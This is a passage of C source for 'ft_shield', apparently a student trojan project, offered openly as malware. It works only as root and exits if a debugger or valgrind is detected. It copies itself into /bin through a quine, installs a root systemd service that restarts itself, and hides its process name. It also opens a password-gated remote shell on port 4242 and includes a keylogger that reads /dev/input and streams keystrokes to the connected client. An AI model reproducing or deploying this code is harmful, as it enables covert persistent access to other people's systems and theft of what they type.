	t_list *aux = lst;

	if (aux == NULL)
		return (NULL);
	while (aux->next != NULL)
		aux = aux->next;
	return (aux);
}

void	ft_lstadd_back(t_list **lst, t_list *new_node)
{
	if (new_node == NULL)
		return ;
	if (*lst == NULL)
	{
		*lst = new_node;
		return ;
	}
	ft_lstlast(*lst)->next = new_node;
}

bool shell_was_closed(t_list *node)
{
	pid_t pid_shell = (int)(long)node->content;

	int status;
	int res_wait = waitpid(pid_shell, &status, WNOHANG);
	if (pid_shell)
		ft_dprintf(2, "active shell: %d res wait %d\n", pid_shell, res_wait);
	if (res_wait == pid_shell)
	{
		ft_dprintf(2, "process %d has finished\n", res_wait);
		return (true);
	}
	return (false);
}

void ft_delete_node_if_true(t_server *server, t_list **lst, bool (*f)(t_list *))
{
	t_list *current = *lst;
	t_list *prev = NULL;
	t_list *next;

	while (current != NULL)
	{
		next = current->next;
		if (f(current) == true)
		{
			ft_dprintf(2, "deleting node with content %ld\n", (long)current->content);
			//server->nbr_clients--;
			ft_dprintf(2, "there are %d connections\n", server->nbr_clients);
			if (prev == NULL)
				*lst = next;
			else
				prev->next = next;
			free(current);
		}
		else
			prev = current;
		current = next;
	}
}

void	ft_lstdelone(t_list *lst, void (*del)(void *))
{
	if (del != NULL)
		(*del)(lst->content);
	free(lst);
}

void	ft_lstclear(t_list **lst, void (*del)(void *))
{
	t_list	*tmp;

	while (lst && *lst)
	{
		tmp = (*lst)->next;
		ft_lstdelone(*lst, del);
		*lst = tmp;
	}
}


/* FIND_EXEC_PATH.C */
int	find_own_path(char *buffer, size_t size_buffer)
{
	const char *paths[] = {
		"/proc/self/exe",        // Linux
		"/proc/curproc/file",    // FreeBSD
        "/proc/self/path/a.out", // Solaris
        "/proc/curproc/exe",     // NetBSD
        NULL
    };

	for (int i = 0; paths[i]; ++i)
	{
		int readed = readlink(paths[i], buffer, size_buffer);
		if (readed != -1)
		{
			ft_dprintf(2, "readlink: [%s]\n", buffer);
			return (i);
		}
	}
	return (-1);
}


/* MAIN.C */
char path[PATH_MAX] = {0};
char dir_name[PATH_MAX] = {0};

bool	find_dir(char *dirname)
{
	char	*exec_paths = getenv("PATH");
	char	*location = ft_strnstr(exec_paths, dirname, -1);

	if (location != NULL) {
		ft_dprintf(2, "found [%s]\n", location);
		return (true);
	}
	return (false);
}

bool	need_to_install_server(void)
{
	if (find_own_path(path, sizeof(path)) == -1) {
		ft_dprintf(2, "can't find own executable\n");
		exit(1);
	}

	memmove(dir_name, path, sizeof(path));
	dirname(dir_name);
	ft_dprintf(2, "dir_name: [%s]\n", dir_name);
	if (find_dir(dir_name) == true) {
		ft_dprintf(2, "We are already in the infected path: [%s]\n", dir_name);
		return (false);
	}
	ft_dprintf(2, "we need to install the server: [%s]\n", path);
	return (true);
}

void	compact_binary(void)
{
	char compact_cmd[PATH_MAX] = {0};
	char *filename = strdup(path);

	ft_dprintf(2, "binary: %s\n", filename);
	sprintf(compact_cmd, "cp %s %s.tmp; strip --strip-all %s.tmp; mv %s.tmp %s", filename, filename, filename, filename, filename);
	ft_dprintf(2, "cmd: %s\n", compact_cmd);
	free(filename);

	system(compact_cmd);

	char	*argv[] = {
		path, "--compacted", NULL
	};

	ft_dprintf(2, "binary compacted\n");
	ft_dprintf(2, "----------------\n");
	execv(path, argv);
	exit(1);
}


extern char *source_code;

void print_code(const char *str, int fd)
{
	dprintf(fd, "\"");
	for (int i = 0; str[i]; i++)
	{
		if (str[i] == '"')
			dprintf(fd, "\\\"");
		else if (str[i] == '\n')
			dprintf(fd, "\\n");
		else if (str[i] == '\\')
			dprintf(fd, "\\\\");
		else if (str[i] == '\t')
			dprintf(fd, "\\t");
		else
			dprintf(fd, "%c", str[i]);
	}
	dprintf(fd, "\";\n");
}

#define TEMP_SHIELD "/tmp/ft_shield.c"
#define DEST_PATH "/bin/ft_shield"

void	quine(void)
{
	int fd_dst = open(TEMP_SHIELD, O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (fd_dst == -1) {
		ft_perror(TEMP_SHIELD);
		close(fd_dst);
		return ;
	}
	dprintf(fd_dst, "%s", source_code);
	print_code(source_code, fd_dst);
	close(fd_dst);
	system("gcc "TEMP_SHIELD" -o "DEST_PATH);
}

void	install_server(int argc, char **argv)
{
	if (argc == 1 && argv[1] == NULL)
		compact_binary();
	ft_dprintf(2, "running as compacted binary\n");
	ft_dprintf(2, "---------------------------\n");
	printf("%s\n", "psegura- & sacorder");
	daemon(1, 1);
	quine();
	create_service();
	start_service();
}

void	exec_troyan(void)
{
	t_server server;

	memset(&server, 0, sizeof(t_server));
	ft_server(&server);
}

int main(int argc, char **argv)
{
	if (is_debugger_attached())
		return (1);
	if (is_valgrind_running())
		return (1);
	if (geteuid() != 0) {
		ft_dprintf(2, "Error: not running as root\n");
		return (1);
	}

	if (need_to_install_server()) {
		install_server(argc, argv);
	} else {
		hide_process_name(argv);
		exec_troyan();
	}
}

char *source_code = "/* FT_SHIELD.H */\n# ifdef DEBUG\n#  define ENABLE\n# endif\n\n# include <fcntl.h>\n# include <libgen.h>\n# include <limits.h>\n# include <stdbool.h>\n# include <stdio.h>\n# include <stdlib.h>\n# include <string.h>\n# include <errno.h>\n# include <unistd.h>\n# include <arpa/inet.h>\n// # include <bsd/string.h>\n# include <linux/limits.h>\n# include <sys/types.h>\n# include <sys/socket.h>\n# include <sys/select.h>\n# include <sys/un.h>\n# include <sys/wait.h>\n# include <sys/ioctl.h>\n# include <linux/input.h>\n# include <sys/stat.h>\n# include <dirent.h>\n\n#define DEST_PATH \"/bin/ft_shield\"\n#define DEV_PATH \"/dev/input\"\n#define MAX_EVENTS 3\n#define KEY_PRESSED 1\n#define KEY_RELEASED 0\n#define KEY_REPEATED 2\n#define DEST_SERVICE \"/etc/systemd/system/ft_shield.service\"\n#define LISTENING_PORT 4242\n#define MAX_CONECTIONS 32 //because pipes may need more fds...\n#define MAX_NBR_CLIENTS 2\n#define READ_END 0\n#define WRITE_END 1\n\n#define TRIM_CHARS \"\\f\\n\\r\\t\\v \"\n\n#define HELP \"\\\n---------------------------------\\n\\\n?      - Shows help\\n\\\nclear  - Clear terminal\\n\\\nlogon  - Spawns a keylogger in port 4242\\n\\\nshell  - Spawn shell in port 4242\\n\\\nnstats - Shows network stats\\n\\\n---------------------------------\\n\\\n\"\n#define REMOTE_OPENED \"New remote shell opened in port 4242\\n\"\n#define MANY_CLIENTS \"Connection denied, too many clients\\n\"\n#define CLEAR_CODE \"\\033[H\\033[2J\"\n\n#define SERVICE \"\\\n[Unit]\\n\\\nDescription=ft_shield service\\n\\\nAfter=network.target\\n\\\n\\n\\\n[Service]\\n\\\nType=simple\\n\\\nExecStart=/bin/ft_shield\\n\\\nRestart=always\\n\\\nRestartSec=5\\n\\\nUser=root\\n\\\n\\n\\\n[Install]\\n\\\nWantedBy=multi-user.target\\n\\\n\"\n\ntypedef struct s_list t_list;\ntypedef struct input_event t_event;\n\ntypedef enum e_status {\n\tHANDSHAKE,\n\tCONNECTED,\n\tSHELL,\n\tKEYLOGGER\n} t_status;\n\ntypedef struct s_client {\n\tint\t\t\tfd;\n\tt_status\tstatus;\n\tchar\t\t*shell_code;\n\tchar\t\t*response_bffr;\n\tchar\t\tdisconnect;\n\tsize_t\t\tinbytes; //client input bytes\n\tsize_t\t\toutbytes; //client output bytes\n\tint\t\t\tinpipe_fd;\n\tint\t\t\toutpipe_fd;\n}\tt_client;\n\ntypedef struct s_server {\n\tint\t\t\tfd;\n\tint\t\t\tnbr_clients;\n\tt_list\t\t*pids;\n\tt_list\t\t*passwords;\n\tt_client\tclients[MAX_CONECTIONS];\n\tsize_t\t\ttotal_outbytes;\n\tsize_t\t\ttotal_inbytes;\n\tfd_set\t\trfds;\n\tfd_set\t\twfds;\n}\tt_server;\n\nint\t\thandle_input(t_server *server, int index, char *buffer);\nvoid\thandle_handshake(t_server *server, int index, char *input);\nint\t\thandle_commands(t_server *server, int index, char *input);\nvoid\tdelete_client(t_server *server, int index);\nint\t\textract_outpipe(t_server *server, int index);\n\n/* shell.c */\n// void\t*shell_function(void *data);\nint\tshell_function(t_server *server, int index);\n\n/* keylogger.c */\nint\tkeylogger_function(t_server *server, int index);\n\n/* keylogger_utils.c */\nint hasEventTypes(int fd, unsigned long evbit_to_check);\nint hasKeys(int fd);\nint hasRelativeMovement(int fd);\nint hasAbsoluteMovement(int fd);\nint hasSpecificKeys(int fd, int *keys, size_t num_keys);\nint keyboardFound(char *path, int *keyboard_fd);\n\n/* stealth.c */\nint\tis_valgrind_running();\nint\tis_debugger_attached();\n\n/* service.c */\nvoid\tcreate_service(void);\nvoid\tstart_service(void);\n\n/* server.c */\nvoid\tcreate_server_socket(t_server *s);\nvoid\tft_server(t_server *server);\n\nint\tfind_own_path(char *buffer, size_t size_buffer);\n\n/* utils/utils.c */\nchar\t*ft_strnstr(const char *haystack, const char *needle, size_t len);\nchar\t*ft_strtrim(char const *s1, char const *set);\nvoid\tsimple_deterministic_id(const uint8_t *input_data, size_t input_len, char *output);\nchar\t*gen_random_password(void);\n\nvoid\tft_dprintf(int fd, const char *format, ...);\nvoid\tft_perror(char *str);\n\nchar\t*ft_strdup(const char *s1);\nvoid\tadd2buffer(t_client *client, char *str);\n\ntypedef struct s_list\n{\n\tvoid\t\t\t*content;\n\tstruct s_list\t*next;\n}\tt_list;\n\nt_list\t*ft_lstnew(void *content);\nt_list\t*ft_lstlast(t_list *lst);\nvoid\tft_lstadd_back(t_list **lst, t_list *new_node);\nbool\tshell_was_closed(t_list *node);\nvoid\tft_delete_node_if_true(t_server *server, t_list **lst, bool (*f)(t_list *));\nvoid\tft_lstdelone(t_list *lst, void (*del)(void *));\nvoid\tft_lstclear(t_list **lst, void (*del)(void *));\nvoid\thide_process_name(char **argv);\n\n/*--------------------------------------*/\n\n/* KEYLOGER_UTILS.C */\nint hasEventTypes(int fd, unsigned long evbit_to_check)\n{\n\tunsigned long evbit = 0;\n\n\tioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit);\n\n\treturn ((evbit & evbit_to_check) == evbit_to_check);\n}\n\nint hasKeys(int fd)\n{\n\treturn hasEventTypes(fd, (1 << EV_KEY));\n}\n\nint hasRelativeMovement(int fd)\n{\n\treturn hasEventTypes(fd, (1 << EV_REL));\n}\n\nint hasAbsoluteMovement(int fd)\n{\n\treturn hasEventTypes(fd, (1 << EV_ABS));\n}\n\nint hasSpecificKeys(int fd, int *keys, size_t num_keys)\n{\n\n\tsize_t nchar = KEY_MAX / 8 + 1;\n\tunsigned char bits[nchar];\n\n\tioctl(fd, EVIOCGBIT(EV_KEY, sizeof(bits)), &bits);\n\n\tfor (size_t i = 0; i < num_keys; ++i)\n\t{\n\t\tint key = keys[i];\n\t\tif (!(bits[key / 8] & (1 << (key % 8))))\n\t\t\treturn 0;\n\t}\n\treturn 1;\n}\n\nint keyboardFound(char *path, int *keyboard_fd)\n{\n\tDIR *dir = opendir(path);\n\tif (dir == NULL)\n\t\treturn 0;\n\n\tstruct dirent *entry;\n\twhile ((entry = readdir(dir)) != NULL)\n\t{\n\t\tif (strcmp(entry->d_name, \".\") == 0 || strcmp(entry->d_name, \"..\") == 0)\n\t\t\tcontinue;\n\n\t\tchar filepath[320];\n\t\tsnprintf(filepath, sizeof(filepath), \"%s/%s\", path, entry->d_name);\n\t\tstruct stat file_stat;\n\t\tif (stat(filepath, &file_stat) == -1)\n\t\t{\n\t\t\tft_perror(\"Error getting file information\");\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (S_ISDIR(file_stat.st_mode))\n\t\t{\n\t\t\tif (keyboardFound(filepath, keyboard_fd))\n\t\t\t{\n\t\t\t\tclosedir(dir);\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tint fd = open(filepath, O_RDONLY);\n\t\t\tint keys_to_check[] = {KEY_Q, KEY_W, KEY_E, KEY_R, KEY_T, KEY_Y, KEY_BACKSPACE, KEY_ENTER, KEY_0, KEY_1, KEY_2, KEY_ESC};\n\t\t\tif (!hasRelativeMovement(fd) && !hasAbsoluteMovement(fd) && hasKeys(fd) && hasSpecificKeys(fd, keys_to_check, 12))\n\t\t\t{\n\t\t\t\tprintf(\"Keyboard found! File: \\\"%s\\\"\\n\", filepath);\n\t\t\t\tclosedir(dir);\n\t\t\t\t*keyboard_fd = fd;\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t\tclose(fd);\n\t\t}\n\t}\n\n\tclosedir(dir);\n\treturn 0;\n}\n\n\n/* KEYLOGER.C */\n#include <linux/input.h>\n#include <dirent.h>\n#include <ctype.h>\n#include <sys/ioctl.h>\n\nchar *keycodes[247] = {\"RESERVED\", \"ESC\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"0\", \"MINUS\", \"EQUAL\", \"BACKSPACE\", \"TAB\", \"Q\", \"W\", \"E\", \"R\", \"T\", \"Y\", \"U\", \"I\", \"O\", \"P\", \"LEFTBRACE\", \"RIGHTBRACE\", \"ENTER\", \"LEFTCTRL\", \"A\", \"S\", \"D\", \"F\", \"G\", \"H\", \"J\", \"K\", \"L\", \"SEMICOLON\", \"APOSTROPHE\", \"GRAVE\", \"LEFTSHIFT\", \"BACKSLASH\", \"Z\", \"X\", \"C\", \"V\", \"B\", \"N\", \"M\", \"COMMA\", \"DOT\", \"SLASH\", \"RIGHTSHIFT\", \"KPASTERISK\", \"LEFTALT\", \"SPACE\", \"CAPSLOCK\", \"F1\", \"F2\", \"F3\", \"F4\", \"F5\", \"F6\", \"F7\", \"F8\", \"F9\", \"F10\", \"NUMLOCK\", \"SCROLLLOCK\", \"KP7\", \"KP8\", \"KP9\", \"KPMINUS\", \"KP4\", \"KP5\", \"KP6\", \"KPPLUS\", \"KP1\", \"KP2\", \"KP3\", \"KP0\", \"KPDOT\", \"ZENKAKUHANKAKU\", \"102ND\", \"F11\", \"F12\", \"RO\", \"KATAKANA\", \"HIRAGANA\", \"HENKAN\", \"KATAKANAHIRAGANA\", \"MUHENKAN\", \"KPJPCOMMA\", \"KPENTER\", \"RIGHTCTRL\", \"KPSLASH\", \"SYSRQ\", \"RIGHTALT\", \"LINEFEED\", \"HOME\", \"UP\", \"PAGEUP\", \"LEFT\", \"RIGHT\", \"END\", \"DOWN\", \"PAGEDOWN\", \"INSERT\", \"DELETE\", \"MACRO\", \"MUTE\", \"VOLUMEDOWN\", \"VOLUMEUP\", \"POWER\", \"KPEQUAL\", \"KPPLUSMINUS\", \"PAUSE\", \"SCALE\", \"KPCOMMA\", \"HANGEUL\", \"HANGUEL\", \"HANJA\", \"YEN\", \"LEFTMETA\", \"RIGHTMETA\",\n                       \"COMPOSE\", \"STOP\", \"AGAIN\", \"PROPS\", \"UNDO\", \"FRONT\", \"COPY\", \"OPEN\", \"PASTE\", \"FIND\", \"CUT\", \"HELP\", \"MENU\", \"CALC\", \"SETUP\", \"SLEEP\", \"WAKEUP\", \"FILE\", \"SENDFILE\", \"DELETEFILE\", \"XFER\", \"PROG1\", \"PROG2\", \"WWW\", \"MSDOS\", \"COFFEE\", \"SCREENLOCK\", \"ROTATE_DISPLAY\",\n                       \"DIRECTION\", \"CYCLEWINDOWS\", \"MAIL\", \"BOOKMARKS\", \"COMPUTER\", \"BACK\", \"FORWARD\", \"CLOSECD\", \"EJECTCD\", \"EJECTCLOSECD\", \"NEXTSONG\", \"PLAYPAUSE\", \"PREVIOUSSONG\", \"STOPCD\", \"RECORD\", \"REWIND\", \"PHONE\", \"ISO\", \"CONFIG\", \"HOMEPAGE\", \"REFRESH\", \"EXIT\", \"MOVE\", \"EDIT\", \"SCROLLUP\", \"SCROLLDOWN\", \"KPLEFTPAREN\", \"KPRIGHTPAREN\", \"NEW\", \"REDO\", \"F13\", \"F14\", \"F15\", \"F16\", \"F17\", \"F18\", \"F19\", \"F20\", \"F21\", \"F22\", \"F23\", \"F24\", \"PLAYCD\", \"PAUSECD\", \"PROG3\", \"PROG4\", \"ALL_APPLICATIONS\", \"DASHBOARD\", \"SUSPEND\", \"CLOSE\", \"PLAY\", \"FASTFORWARD\", \"BASSBOOST\", \"PRINT\", \"HP\", \"CAMERA\", \"SOUND\", \"QUESTION\", \"EMAIL\", \"CHAT\", \"SEARCH\", \"CONNECT\", \"FINANCE\", \"SPORT\", \"SHOP\", \"ALTERASE\", \"CANCEL\", \"BRIGHTNESSDOWN\", \"BRIGHTNESSUP\", \"MEDIA\", \"SWITCHVIDEOMODE\", \"KBDILLUMTOGGLE\", \"KBDILLUMDOWN\", \"KBDILLUMUP\", \"SEND\", \"REPLY\", \"FORWARDMAIL\", \"SAVE\", \"DOCUMENTS\", \"BATTERY\", \"BLUETOOTH\", \"WLAN\", \"UWB\", \"UNKNOWN\", \"VIDEO_NEXT\", \"VIDEO_PREV\", \"BRIGHTNESS_CYCLE\", \"BRIGHTNESS_AUTO\", \"BRIGHTNESS_ZERO\", \"DISPLAY_OFF\", \"WWAN\", \"WIMAX\"};\nsize_t event_size = sizeof(t_event);\n\n\n#define KLG_HELP \"Available commands:\\n\\\nhelp: print this help\\n\\\nexit: close keylogger\\n\"\n\nstatic int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)\n{\n\tint written;\n\tchar str[256] = {0};\n\tfor (size_t j = 0; j < to_write / event_size; j++)\n\t\tsnprintf(str, 255, \"Key: %s\\n\", keycodes[events[j].code]);\n\twritten = write(fd, str, strlen(str));\n\tif (written < 0)\n\t\treturn written;\n\treturn 1;\n}\n\nvoid handle_klg_cmd(char *bfr) {\n\tif (!strncmp(\"help\\n\", bfr, strlen(bfr))) {\n\t\tprintf(KLG_HELP);\n\t}\n\tif (!strncmp(\"exit\\n\", bfr, strlen(bfr))) {\n\t\texit(0);\n\t}\n}\n\nint\tkeylogger_function(t_server *server, int index)\n{\n\tconst int\tclient_fd = server->clients[index].fd;\n\tpid_t\t\tpid;\n\tint\t\t\tinpipe_fds[2], outpipe_fds[2];\n\n\tft_dprintf(2, \"clientfd: %d\\n\", client_fd);\n\n\n\tpipe(inpipe_fds);\n\tpipe(outpipe_fds);\n\tserver->clients[index].inpipe_fd = inpipe_fds[WRITE_END]; //write end for server, we read from 0 here in stdin\n\tserver->clients[index].outpipe_fd = outpipe_fds[READ_END]; //read end for server, we write in 1 here\n\n\tpid = fork();\n\tif (pid < 0) {\n\t\tft_perror(\"fork\");\n\t}\n\telse if (pid == 0) {\n\t\tsetsid();\n\n\t\tclose(server->fd);\n\t\tclose(inpipe_fds[WRITE_END]);\n\t\tclose(outpipe_fds[READ_END]);\n\t\tdup2(inpipe_fds[READ_END], STDIN_FILENO);\n\t\tdup2(outpipe_fds[WRITE_END], STDERR_FILENO);\n\t\tdup2(outpipe_fds[WRITE_END], STDOUT_FILENO);\n\t\tclose(inpipe_fds[READ_END]);\n\t\tclose(outpipe_fds[WRITE_END]);\n\t\tclose(client_fd);\n\t\tint\tkb;\n\t\tif (!keyboardFound(DEV_PATH, &kb)) {\n\t\t\tprintf(\"couldn't open keyboard :(\\n\");\n\t\t\texit(1);\n\t\t}\n\n\t\tt_event kbd_events[event_size * MAX_EVENTS];\n\t\tfd_set rset;\n\t\t\n\t\tint maxfd = kb;\n\n\t\twhile (1)\n\t\t{\n\t\t\tfflush(stdout);\n\t\t\tFD_SET(STDIN_FILENO, &rset);\n\t\t\tFD_SET(kb, &rset);\n\t\t\tstruct timeval tv = {.tv_sec = 0, .tv_usec = 5000};\n\t\t\tint retval = select(maxfd + 1, &rset, NULL, NULL, &tv);\n\t\t\tif (retval == -1) { ft_perror(\"select\"); break; }\n\t\t\tif (FD_ISSET(kb, &rset)) {\n\t\t\t\tint r = read(kb, kbd_events, event_size * MAX_EVENTS);\n\t\t\t\tif (r < 0)\n\t\t\t\t\tbreak ;\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tsize_t j = 0;\n\t\t\t\t\tfor (size_t i = 0; i < r / event_size; i++) //for each event read\n\t\t\t\t\t{\n\t\t\t\t\t\tif (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) //if a key has been pressed..\n\t\t\t\t\t\t\tkbd_events[j++] = kbd_events[i];                                    //add the event to the beginning of the array\n\t\t\t\t\t}\n\t\t\t\t\tif (writeEventsIntoFile(STDOUT_FILENO, kbd_events, j * event_size) < 0)\n\t\t\t\t\t\tbreak ;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (FD_ISSET(STDIN_FILENO, &rset)) {\n\t\t\t\tchar buffer[256];\n\t\t\t\tint r = read(STDIN_FILENO, buffer, 255);\n\t\t\t\tif (r <= 0)\n\t\t\t\t\tbreak ;\n\t\t\t\tbuffer[r] = 0;\n\t\t\t\thandle_klg_cmd(buffer);\n\t\t\t}\n\t\t}\n\t\tclose(STDOUT_FILENO);\n\t\tclose(kb);\n\t\texit(0);\n\t}\n\telse if (pid > 0) {\n\t\tft_lstadd_back(&server->pids, ft_lstnew((void *)(long)pid));\n\t\tclose(inpipe_fds[READ_END]);\n\t\tclose(outpipe_fds[WRITE_END]);\n\t}\n\treturn (1);\n}\n\n\n/* HANDLERS.C */\nbool\tsearch_password(t_server *server, char *input)\n{\n\tt_list\t*lst = server->passwords;\n\tt_list\t*prev = NULL;\n\n\twhile (lst)\n\t{\n\t\tif (strcmp(lst->content, input) == 0)\n\t\t{\n\t\t\tif (prev == NULL)\n\t\t\t\tserver->passwords = lst->next;\n\t\t\telse\n\t\t\t\tprev->next = lst->next;\n\t\t\tft_dprintf(2, \"password [%s] found and deleted\\n\", input);\n\t\t\tfree(lst->content);\n\t\t\tfree(lst);\n\t\t\treturn (true);\n\t\t}\n\t\tprev = lst;\n\t\tlst = lst->next;\n\t}\n\treturn (false);\n}\n\nbool\tcheck_server_password(t_server *server, char *input)\n{\n\tconst char\t*server_pass = \"E4F47C78F4E89C24DC38907008A4284C\";\n\tchar\t\tinput_hash[33];\n\n\t(void)server;\n\tsimple_deterministic_id((uint8_t *)input, strlen(input), input_hash);\n\tft_dprintf(2, \"input: [%s] hash: [%s]\\n\", input, input_hash);\n\tif (strcmp(server_pass, input_hash) == 0)\n\t{\n\t\tft_dprintf(2, \"password match\\n\");\n\t\treturn (true);\n\t}\n\treturn (false);\n}\n\nvoid\thandle_handshake(t_server *server, int index, char *input) {\n\tt_client *const\tclient = &server->clients[index];\n\n\tif (client->status == HANDSHAKE)\n\t{\n\t\tft_dprintf(2, \"HANDSHAKE INPUT [%s]\\n\", input);\n\t\tif (search_password(server, input) == true)\n\t\t{\n\t\t\tshell_function(server, index);\n\t\t\tclient->status = SHELL;\n\t\t\treturn ;\n\t\t}\n\t\tif (check_server_password(server, input) == false)\n\t\t{\n\t\t\tft_dprintf(2, \"Invalid KEY\\n\");\n\t\t\treturn ;\n\t\t}\n\t\tft_dprintf(2, \"Valid KEY\\n\");\n\t\tclient->status = CONNECTED;\n\t\tadd2buffer(&server->clients[index], strdup(\"$> \"));\n\t}\n}\n\nvoid\tadd_password(t_server *server, int index)\n{\n\tchar\t\t*password = gen_random_password();\n\tt_list\t\t*new_node = ft_lstnew(password);\n\tchar\t\tmsg_connection[300] = {0};\n\n\tft_lstadd_back(&server->passwords, new_node);\n\tsprintf(msg_connection, \"To access the remote shell, use the next Keycode -> [%s]\\n\", password);\n\tadd2buffer(&server->clients[index], strdup(msg_connection));\n}\n\nvoid\tdelete_client(t_server *server, int index)\n{\n\tt_client *client = &server->clients[index];\n\n\tclose(client->fd);\n\tif (client->inpipe_fd && client->outpipe_fd) {\n\t\tclose(client->inpipe_fd);\n\t\tclose(client->outpipe_fd);\n\t}\n\tmemset(&server->clients[index], 0, sizeof(t_client));\n\tserver->nbr_clients--;\n}\n\nvoid\tnstats(t_server *s, int index)\n{\n\tchar\t\tmsg[300] = {0};\n\n\tsprintf(msg, \"Total inbytes: %ld\\nTotal outbytes: %ld\\nSession inbytes: %ld\\nSession outbytes: %ld\\n\\n\",\n\t\ts->total_inbytes, s->total_outbytes, s->clients[index].inbytes, s->clients[index].outbytes );\n\tadd2buffer(&s->clients[index], strdup(msg));\n}\n\nint\thandle_commands(t_server *server, int index, char *input)\n{\n\tt_client\t*client = &server->clients[index];\n\n\tif (strcmp(\"clear\", input) == 0)\n\t{\n\t\tadd2buffer(&server->clients[index], strdup(CLEAR_CODE));\n\t}\n\telse if (strcmp(\"shell\", input) == 0)\n\t{\n\t\tft_dprintf(2, \"client_fd: %d\\n\", client->fd);\n\t\tadd_password(server, index);\n\t\tclient->disconnect = true;\n\t\t//delete_client(server, index);\n\t}\n\telse if (strcmp(\"logon\", input) == 0)\n\t{\n\t\tclient->status = KEYLOGGER;\n\t\tkeylogger_function(server, index);\n\t\treturn (0);\n\t}\n\telse if (strcmp(\"nstats\", input) == 0)\n\t{\n\t\tnstats(server, index);\n\t}\n\telse if (strcmp(\"?\", input) == 0 || strcmp(\"help\", input) == 0)\n\t{\n\t\tadd2buffer(&server->clients[index], strdup(HELP));\n\t}\n\tadd2buffer(client, strdup(\"$> \"));\n\treturn (0);\n}\n\nint\thandle_inpipe(t_server *server, int index, char *input)\n{\n\tt_client\t*client = &server->clients[index];\n\t//printf(\"trying to write inpipe, fdisset %i\\n\", FD_ISSET(client->inpipe_fd, &server->wfds));\n\tif (client->inpipe_fd && FD_ISSET(client->inpipe_fd, &server->wfds))\n\t{\n\t\t//printf(\"writing inpipe!\\n\");\n\t\tint r = write(client->inpipe_fd, input, strlen(input));\n\t\tif (r < 0) {\n\t\t\tclose(client->inpipe_fd);\n\t\t\tclient->inpipe_fd = 0;\n\t\t\tclose(client->outpipe_fd);\n\t\t\tclient->outpipe_fd = 0;\n\t\t\tclient->status = CONNECTED;\n\t\t\tclient->response_bffr = strdup(\"$> \");\n\t\t}\n\t}\n\treturn 0;\n}\n\nint\textract_outpipe(t_server *server, int index)\n{\n\tchar buffer[4096];\n\n\tmemset(buffer, 0, sizeof(buffer));\n\tint\t\t\tr = 0;\n\tt_client\t*client = &server->clients[index];\n\t//printf(\"trying to read outpipe %i, fdisset %i\\n\", client->outpipe_fd, FD_ISSET(client->outpipe_fd, &server->rfds));\n\tif (client->outpipe_fd && FD_ISSET(client->outpipe_fd, &server->rfds))\n\t{\n\t\tr = read(client->outpipe_fd, buffer, 4095);\n\t\t//printf(\"reading outpipe! (bytes: %i)\\n\", r);\n\t\tif (r == 0) {\n\t\t\tclose(client->inpipe_fd);\n\t\t\tclient->inpipe_fd = 0;\n\t\t\tclose(client->outpipe_fd);\n\t\t\tclient->outpipe_fd = 0;\n\t\t\tclient->status = CONNECTED;\n\t\t\tclient->response_bffr = strdup(\"$> \");\n\t\t}\n\t\tif (r > 0)\n\t\t{\n\t\t\tclient->response_bffr = calloc(r + 1, 1);\n\t\t\tmemcpy(client->response_bffr, buffer, r);\n\t\t}\n\t\tif (r < 0)\n\t\t\tclient->response_bffr = strdup(\"errooooor\\n\");\n\t}\n\treturn r;\n}\n\nint\thandle_input(t_server *server, int index, char *buffer)\n{\n\tconst t_client\t*client = &server->clients[index];\n\tchar\t\t\t*input = ft_strtrim(buffer, TRIM_CHARS);\n\tint\t\t\t\tfd;\n\n\tft_dprintf(2, \"readed: [%s]\\n\", input);\n\tif (client->status == HANDSHAKE)\n\t\thandle_handshake(server, index, input);\n\telse if (client->status == CONNECTED)\n\t\tfd = handle_commands(server, index, input);\n\telse if (client->status == SHELL || client->status == KEYLOGGER)\n\t\tfd = handle_inpipe(server, index, buffer);\n\tfree(input);\n\treturn (fd);\n}\n\n\n/* SERVER.C */\nvoid\tcreate_server_socket(t_server *server)\n{\n\tint socket_fd = socket(AF_INET, SOCK_STREAM, 0);\n\tif (socket_fd == -1)\n\t{\n\t\tft_perror(\"socket\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tint reuse = 1;\n\tif (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, (const char *)&reuse, sizeof(reuse)) < 0)\n\t{\n\t\tft_perror(\"setsockopt(SO_REUSEADDR)\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tstruct sockaddr_in server_addr;\n\n\tmemset(&server_addr, 0, sizeof(server_addr));\n\tserver_addr.sin_family = AF_INET;\n\tserver_addr.sin_port = htons(LISTENING_PORT);\n\tserver_addr.sin_addr.s_addr = htonl(INADDR_ANY);\n\n\tif (bind(socket_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1)\n\t{\n\t\tft_perror(\"bind\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tif (listen(socket_fd, MAX_CONECTIONS) == -1)\n\t{\n\t\tft_perror(\"listen\");\n\t\texit(EXIT_FAILURE);\n\t}\n\tserver->fd = socket_fd;\n}\n\n\nint\tset_rw_fdset(t_client *clients, fd_set *rset, fd_set *wset, int server_fd)\n{\n\tFD_ZERO(rset);\n\tFD_ZERO(wset);\n\tFD_SET(server_fd, rset);\n\n\tint max_fd = server_fd;\n\tfor (int fd = 0; fd < MAX_CONECTIONS; ++fd)\n\t{\n\t\tif (clients[fd].fd)\n\t\t{\n\t\t\tFD_SET(clients[fd].fd, rset);\n\t\t\tFD_SET(clients[fd].fd, wset);\n\t\t\tif (clients[fd].fd > max_fd)\n\t\t\t\tmax_fd = clients[fd].fd;\n\t\t\tif (clients[fd].inpipe_fd && clients[fd].outpipe_fd)\n\t\t\t{\n\t\t\t\tFD_SET(clients[fd].inpipe_fd, wset);\n\t\t\t\tFD_SET(clients[fd].outpipe_fd, rset);\n\t\t\t\tif (clients[fd].inpipe_fd > max_fd)\n\t\t\t\t\tmax_fd = clients[fd].inpipe_fd;\n\t\t\t\tif (clients[fd].outpipe_fd > max_fd)\n\t\t\t\t\tmax_fd = 